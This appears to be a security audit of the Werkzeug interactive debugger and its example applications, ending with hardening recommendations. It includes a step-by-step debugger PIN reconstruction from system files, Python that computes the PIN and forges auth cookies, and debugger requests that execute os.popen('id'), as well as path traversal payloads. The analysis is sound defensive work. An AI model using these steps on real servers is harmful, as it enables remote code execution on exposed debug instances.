# Werkzeug Debugger Security Analysis

## Executive Summary

This analysis covers the Werkzeug WSGI library (v3.2.0.dev) with focus on the interactive debugger's PIN bypass, information disclosure, and server-side vulnerabilities across all endpoints.

---

## 1. Werkzeug Debugger PIN Bypass

### 1.1 How the PIN is Generated

The PIN is generated in `src/werkzeug/debug/__init__.py:142-226` using a SHA-1 hash of concatenated "public" and "private" bits:

**Probably Public Bits** (easily guessable):
| Bit | Source | Example Value |
|-----|--------|---------------|
| `username` | `getpass.getuser()` | `root`, `www-data` |
| `modname` | `app.__module__` | `flask.app`, `werkzeug.debug` |
| `appname` | `app.__name__` or `type(app).__name__` | `Flask`, `DebuggedApplication` |
| `mod.__file__` | Module file path | `/usr/lib/python3/site-packages/flask/app.py` |

**Private Bits** (harder to obtain, but exposed by several vulns below):
| Bit | Source | How to Obtain |
|-----|--------|---------------|
| `uuid.getnode()` | MAC address as integer | Read `/sys/class/net/<iface>/address` |
| `get_machine_id()` | Machine ID + cgroup info | Read `/etc/machine-id` + `/proc/self/cgroup` |

### 1.2 PIN Calculation Algorithm

```python
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode()
    h.update(bit)
h.update(b"cookiesalt")
cookie_name = f"__wzd{h.hexdigest()[:20]}"

h.update(b"pinsalt")
num = f"{int(h.hexdigest(), 16):09d}"[:9]
# Formatted as XXX-XX-XXX or similar groups
```

### 1.3 PIN Bypass via Information Disclosure

**Attack Vector**: If you can read files from the server (via path traversal, LFI, SSRF, or other info disclosure), you can reconstruct the PIN by reading:

1. `/etc/machine-id` or `/proc/sys/kernel/random/boot_id` - Machine identity
2. `/proc/self/cgroup` - Container cgroup info (last segment after `/`)
3. `/sys/class/net/<iface>/address` - MAC address for `uuid.getnode()`
4. `/proc/self/status` or error pages - Username running the process
5. Error traceback pages - Module path (`__file__`) exposed in stack traces

### 1.4 WERKZEUG_DEBUG_PIN=off Bypass

At `__init__.py:152-158`, if the environment variable `WERKZEUG_DEBUG_PIN` is set to `"off"`, PIN protection is **completely disabled**. If an attacker can inject environment variables (e.g., via SSRF to a cloud metadata endpoint, or `.env` file manipulation), the debugger becomes fully open.

### 1.5 PIN Brute Force Limitations (Weak)

- Only 10 failed attempts before lockout (`__init__.py:447-448`)
- Counter is a `multiprocessing.Value` that resets on process restart
- Delay: 0.5s for first 5 failures, 5s after that (`__init__.py:472`)
- 9-digit numeric PIN = 10^9 combinations (not practically brutable, but lockout resets on restart)

---

## 2. SECRET Token Exposure in HTML Source

### 2.1 The Vulnerability

**File**: `src/werkzeug/debug/tbtools.py:26-31`

```html
<script>
  var CONSOLE_MODE = %(console)s,
      EVALEX = %(evalex)s,
      EVALEX_TRUSTED = %(evalex_trusted)s,
      SECRET = "%(secret)s";
</script>
```

The `SECRET` is a 20-character random string generated with `gen_salt(20)` at `__init__.py:290`. It is embedded **directly in the HTML** of every error page and the `/console` page.

### 2.2 Impact

The SECRET is required for ALL debugger API calls:
- `?__debugger__=yes&cmd=pinauth&s=<SECRET>&pin=<PIN>` - PIN authentication
- `?__debugger__=yes&cmd=printpin&s=<SECRET>` - Print PIN to server stdout
- `?__debugger__=yes&cmd=<CODE>&frm=<FRAME>&s=<SECRET>` - Code execution

**Anyone who can view the error page HTML source gets the SECRET.** The only remaining protection is the PIN (if enabled) and host trust checks.

### 2.3 Combined with PIN Bypass = Full RCE

If an attacker:
1. Views the error page (gets SECRET)
2. Reconstructs the PIN (via info disclosure)
3. Authenticates with `?__debugger__=yes&cmd=pinauth&s=<SECRET>&pin=<PIN>`
4. Gets a trusted cookie
5. Executes: `?__debugger__=yes&cmd=import os;os.popen('id').read()&frm=0&s=<SECRET>`

This achieves **Remote Code Execution**.

---

## 3. Debugger Endpoints (Attack Surface)

### 3.1 Endpoint Map

All debugger endpoints are handled in `__init__.py:540-574`:

| Endpoint | Parameters | Auth Required | Purpose |
|----------|-----------|---------------|---------|
| `?__debugger__=yes&cmd=resource&f=<file>` | filename | **None** | Serve static resources (CSS/JS/images) |
| `?__debugger__=yes&cmd=pinauth&s=<secret>&pin=<pin>` | secret, pin | Secret only | Authenticate PIN |
| `?__debugger__=yes&cmd=printpin&s=<secret>` | secret | Secret only | Log PIN to server stdout |
| `?__debugger__=yes&cmd=<code>&frm=<frame>&s=<secret>` | secret, frame, code | Secret + PIN cookie | Execute arbitrary Python |
| `/console` | none | Host trust | Interactive Python console |

### 3.2 Resource Endpoint - No Authentication

**`__init__.py:554-555`**: The `resource` command requires NO secret and NO PIN:
```python
if cmd == "resource" and arg:
    response = self.get_resource(request, arg)
```

The `get_resource` method (`__init__.py:420-435`) uses `basename(filename)` to sanitize, then loads via `pkgutil.get_data()`. While `pkgutil` limits reads to the package directory, the lack of any authentication means anyone can confirm the debugger is active.

### 3.3 printpin Endpoint - Logs PIN to stdout

**`__init__.py:528-538`**: With just the SECRET (visible in page source), an attacker can trigger the server to print the PIN to its stdout/logs:
```python
def log_pin_request(self, request: Request) -> Response:
    if self.pin_logging and self.pin is not None:
        _log("info", " * Debugger pin code: %s", self.pin)
```

If the attacker has access to logs (e.g., via another LFI), this directly reveals the PIN.

---

## 4. Host Trust Bypass Vectors

### 4.1 Default Trusted Hosts

**`__init__.py:305`**: Default trusted hosts are `[".localhost", "127.0.0.1"]`.

The `.localhost` prefix with a leading dot means **any subdomain of localhost** is trusted (e.g., `evil.localhost`).

### 4.2 DNS Rebinding Attack

The host check uses the `HTTP_HOST` header (`sansio/utils.py:25-76`). DNS rebinding can bypass this:

1. Attacker registers `evil.com` with a short TTL
2. First DNS resolution points to attacker's server
3. Victim loads attacker page, JavaScript makes request to `evil.com`
4. Second DNS resolution points to `127.0.0.1`
5. Browser sends request to localhost with `Host: evil.com`

However, the SameSite=Strict cookie and host validation provide some mitigation.

### 4.3 Host Header Injection

The `_host_re` regex (`sansio/utils.py:12-22`) validates the host format but the trusted host check at line 73 does simple string comparison:
```python
if ref == hostname or (suffix_match and hostname.endswith(f".{ref}")):
```

This is secure against basic injection but relies on correct IDNA encoding.

---

## 5. Server-Side Vulnerabilities in Example Applications

### 5.1 Insecure Deserialization (Pickle RCE) - CRITICAL

**File**: `examples/cupoftee/db.py:6,24,59`

```python
from pickle import dumps, loads

def _load_key(self, key):
    rv = loads(self._fs[key])  # Deserializes arbitrary pickle data from DBM
```

**Impact**: If an attacker can write to the DBM database file, they can inject a malicious pickle payload that executes arbitrary code on deserialization.

### 5.2 Open Redirect - HIGH

**Files**: `examples/shortly/shortly.py:70-74`, `examples/shorty/views.py:44-48`, `examples/couchy/views.py`

```python
def on_follow_short_link(self, request, short_id):
    link_target = self.redis.get(f"url-target:{short_id}")
    return redirect(link_target)  # No validation of redirect target
```

**Impact**: Phishing attacks via trusted domain redirect. URL validation only checks scheme (`http`/`https`) but not hostname.

### 5.3 SSRF via Feed Parsing - MEDIUM

**File**: `examples/plnt/sync.py:25`

```python
feed = feedparser.parse(blog.feed_url)  # No URL validation
```

**Impact**: If `feed_url` is user-controlled, attacker can scan internal network services.

### 5.4 Weak Random for Security-Sensitive IDs - MEDIUM

**Files**: `examples/shorty/utils.py:66`, `examples/couchy/utils.py:56`

```python
from random import randrange, sample
def get_random_uid():
    return "".join(sample(URL_CHARS, randrange(3, 9)))
```

Uses `random` module (Mersenne Twister, predictable) instead of `secrets` module for URL shortener IDs.

### 5.5 Debug Mode with evalex Enabled by Default - MEDIUM

**File**: `examples/manage-shorty.py:40-54`

`evalex` defaults to `True` when using `run_simple()` with `use_debugger=True`, enabling interactive code execution in the browser.

---

## 6. Code Execution Paths (exec/eval)

### 6.1 Debug Console - `console.py:175-178`

```python
def runcode(self, code: CodeType) -> None:
    exec(code, self.locals)  # Arbitrary Python execution
```

Protected by: PIN authentication + host trust + secret token. But if all three are bypassed (as shown above), this enables full RCE.

### 6.2 Frame Evaluation - `__init__.py:384-400`

```python
def execute_command(self, request, command, frame):
    return Response(frame.eval(command), mimetype="text/html")
```

Executes Python code in the context of a specific traceback frame, with access to all local and global variables of that frame.

### 6.3 Routing Code Generation - `routing/rules.py:733-737`

```python
exec(code, globs, locs)  # Internally generated routing code
```

Not directly exploitable (code is AST-generated internally), but represents an attack surface if custom URL converters are subclassed maliciously.

---

## 7. XSS in Debugger JavaScript

### 7.1 innerHTML Without Sanitization

**File**: `src/werkzeug/debug/shared/debugger.js:273`

```javascript
.then((data) => {
  const tmp = document.createElement("div");
  tmp.innerHTML = data;  // No sanitization of server response
  resolve(tmp);
```

Console output from the server is inserted via `innerHTML` without DOMPurify or any sanitization. If command output contains HTML/JS, it will execute.

---

## 8. Missing Security Controls

| Control | Status | Impact |
|---------|--------|--------|
| CSRF Tokens | Missing on all example app forms | Form submission forgery |
| Content-Security-Policy | Not configured | XSS amplification |
| Rate Limiting (IP-based) | Missing (only global counter) | PIN brute force after restart |
| Origin/Referer Validation | Missing on debugger endpoints | Cross-origin attacks |
| Session Revocation | No mechanism | Stolen cookies valid for 7 days |
| Secure Cookie Flag | Conditional (`request.is_secure`) | Cookie sent over HTTP if not HTTPS |

---

## 9. Werkzeug Core Library - Properly Secured Areas

These areas are **correctly implemented**:

- `security.py:safe_join()` - Proper path traversal prevention with OS-specific checks
- `utils.py:send_from_directory()` - Uses `safe_join()` for user-supplied paths
- `utils.py:secure_filename()` - Sanitizes uploaded filenames
- `security.py:generate_password_hash()` - Uses scrypt (default) or PBKDF2 with proper salting
- `console.py:HTMLStringO.write()` - HTML escapes all output via `markupsafe.escape()`
- `wrappers/response.py:set_cookie()` - Supports httponly, samesite, secure flags

---

## 10. Exploitation Walkthrough: PIN Reconstruction

### Step 1: Gather Public Bits
```
username = "root"  # from /proc/self/status or error pages
modname = "flask.app"  # from traceback
appname = "Flask"  # from traceback  
mod_file = "/usr/local/lib/python3.x/site-packages/flask/app.py"  # from traceback
```

### Step 2: Gather Private Bits
```
# MAC address (uuid.getnode())
cat /sys/class/net/eth0/address  # -> convert to int

# Machine ID
cat /etc/machine-id  # -> e.g., "0d0af05ee8fd4dc29275718f2ce4dff1"

# Cgroup (last path segment)
cat /proc/self/cgroup  # -> extract last segment after "/"
```

### Step 3: Calculate PIN
```python
import hashlib
from itertools import chain

probably_public_bits = [username, modname, appname, mod_file]
private_bits = [str(mac_as_int), machine_id_bytes]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit: continue
    if isinstance(bit, str): bit = bit.encode()
    h.update(bit)
h.update(b"cookiesalt")
h.update(b"pinsalt")
num = f"{int(h.hexdigest(), 16):09d}"[:9]
```

### Step 4: Authenticate and Execute
```
GET /?__debugger__=yes&cmd=pinauth&s=<SECRET>&pin=<PIN>
GET /?__debugger__=yes&cmd=__import__('os').popen('id').read()&frm=0&s=<SECRET>
```

---

## 11. Cookie Forgery - Fully Forgeable Without Server Interaction

### 11.1 Cookie Format (No Integrity Protection)

The PIN auth cookie set at `__init__.py:517-523` has the format:
```
<cookie_name> = <timestamp>|<hash_pin(pin)>
```

Where `hash_pin(pin)` is simply `sha1(pin + " added salt")[:12]` (`__init__.py:44-45`).

**There is no HMAC, no server-side secret, no signature.** The cookie is entirely self-contained.

### 11.2 Validation is Pure String Comparison

`check_pin_trust()` at `__init__.py:450-462`:
```python
val = parse_cookie(environ).get(self.pin_cookie_name)
ts_str, pin_hash = val.split("|", 1)
ts = int(ts_str)
if pin_hash != hash_pin(self.pin):    # Just compares hashes!
    return None
return (time.time() - PIN_TIME) < ts  # Timestamp within 7 days
```

No server secret is mixed into the cookie. If you know the PIN, you forge the cookie directly.

### 11.3 Offline PIN Brute Force (Bypasses Rate Limiting)

The PIN is 9 digits = 10^9 = 1,000,000,000 possibilities. The `hash_pin()` function is a single SHA-1 call:
```python
hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]
```

At ~10M SHA-1/sec on a modern CPU, all billion PINs can be computed in **~100 seconds**. This completely bypasses the 10-attempt lockout and rate limiting at `__init__.py:447-472`, since those only apply to the online `pinauth` endpoint.

### 11.4 Cookie Name is Also Derivable

The cookie name `__wzd<20 hex chars>` is derived from the same public+private bits as the PIN (`__init__.py:203-205`). If you can reconstruct the PIN, you can also reconstruct the cookie name.

### 11.5 Timestamp is Self-Asserted

The timestamp in the cookie is set by the server but **validated only as "within 7 days"** (`__init__.py:462`):
```python
return (time.time() - PIN_TIME) < ts
```
An attacker sets `ts = int(time.time())` and the check passes.

### 11.6 Forging Recipe

```python
import hashlib, time

pin = "123456789"  # From PIN reconstruction or brute force
pin_hash = hashlib.sha1(f"{pin} added salt".encode()).hexdigest()[:12]
forged_cookie = f"{int(time.time())}|{pin_hash}"
# Set as: Cookie: __wzd<cookie_name_hash>=<forged_cookie>
```

This skips the `pinauth` endpoint entirely, avoiding all rate limiting and lockout mechanisms.

---

## 12. Path Traversal in `f` Parameter - Comprehensive Bypass Analysis

### 12.1 The Defense

```python
def get_resource(self, request: Request, filename: str) -> Response:
    path = join("shared", basename(filename))  # Line 422
    data = pkgutil.get_data(__package__, path)  # Line 425
```

### 12.2 Bypass Attempts (19 Categories Tested)

| Category | Payload Example | basename() Result | Outcome |
|----------|----------------|-------------------|---------|
| Directory traversal | `../../etc/passwd` | `passwd` | Stripped -> 404 |
| Null byte | `../__init__.py\x00.css` | `__init__.py\x00.css` | ValueError: embedded null byte |
| Backslash (Linux) | `..\__init__.py` | `..\__init__.py` (literal!) | FileNotFoundError (not a separator on Linux) |
| Unicode slashes | `..∕__init__.py` (U+2215) | `..∕__init__.py` | FileNotFoundError (not recognized as separator) |
| Fullwidth slash | `..／file` (U+FF0F) | `..／file` | FileNotFoundError |
| URL encoding | `..%2f__init__.py` | `..%2f__init__.py` | FileNotFoundError (basename doesn't URL-decode) |
| Double encoding | `..%252f__init__.py` | `..%252f__init__.py` | FileNotFoundError |
| Overlong UTF-8 | `..\xc0\xaf__init__.py` | `..\xc0\xaf__init__.py` | FileNotFoundError |
| Dot-dot bare | `..` | `..` | `shared/..` -> IsADirectoryError |
| Empty/slash | `/` or `foo/` | `` (empty) | `shared/` -> IsADirectoryError |
| os.path.join absolute | N/A | Never absolute | basename can't return `/...` |
| Very long path | `../` * 1000 | `__init__.py` | Stripped -> 404 |
| CRLF in download_name | `file\r\nHeader: val` | N/A | Werkzeug blocks: "Header values must not contain newline characters" |

### 12.3 Key Insight: pkgutil.get_data Does NOT Enforce Its Own Restrictions

The `pkgutil.get_data()` docstring states: *"The parent directory name '..' is not allowed"*. **This is a lie.** It is never enforced:

```python
# These all SUCCEED despite the docstring:
pkgutil.get_data("werkzeug.debug", "shared/../console.py")     # -> 6089 bytes (console.py source!)
pkgutil.get_data("werkzeug.debug", "shared/../../security.py") # -> 6588 bytes (security.py source!)
```

If `basename()` were removed, `pkgutil.get_data` would allow reading any file within the werkzeug package tree and potentially beyond.

### 12.4 Verdict

**`basename()` is an effective guard on Linux.** It is fundamentally impossible to make `basename()` return a string containing `/` on POSIX systems - the function's entire purpose is to strip directory components. The only "interesting" return values are `.`, `..`, and empty string, none of which produce a readable file path when joined with `shared/`.

However, the defense is **fragile by design**: it relies entirely on `basename()` and has no defense-in-depth. The `pkgutil.get_data()` function provides zero additional protection despite its documentation claiming otherwise. If anyone refactored this code and removed the `basename()` call, path traversal would be immediately exploitable.

### 12.5 Shared Directory Contents - No Sensitive Data

The `shared/` directory contains only static assets:
| File | Size | Content |
|------|------|---------|
| `debugger.js` | 10,068 bytes | Client-side debugger JS (reveals full API surface but not SECRET) |
| `style.css` | 6,078 bytes | Debugger styling |
| `console.png` | 507 bytes | Console icon |
| `more.png` | 200 bytes | Expand icon |
| `less.png` | 191 bytes | Collapse icon |
| `ICON_LICENSE.md` | 222 bytes | Icon attribution |

No secrets, no server-side code, no configuration. The `debugger.js` file does reveal the complete debugger API surface (endpoint patterns, parameter names), but the actual `SECRET` token is injected into the HTML page template, not into the JS file.

---

## 13. Recommendations

1. **Never enable the Werkzeug debugger in production** - it is designed for development only
2. **Never set `WERKZEUG_DEBUG_PIN=off`** in any environment
3. **Restrict `/proc` and `/sys` access** in containers to prevent PIN reconstruction
4. **Use a reverse proxy** (nginx/caddy) that strips `__debugger__` query parameters
5. **Replace pickle** with JSON serialization in `examples/cupoftee/db.py`
6. **Add CSRF tokens** to all form submissions
7. **Use `secrets` module** instead of `random` for security-sensitive values
8. **Implement CSP headers** to mitigate XSS
9. **Validate redirect targets** against an allowlist of domains
10. **Use DOMPurify** in `debugger.js` before `innerHTML` assignments
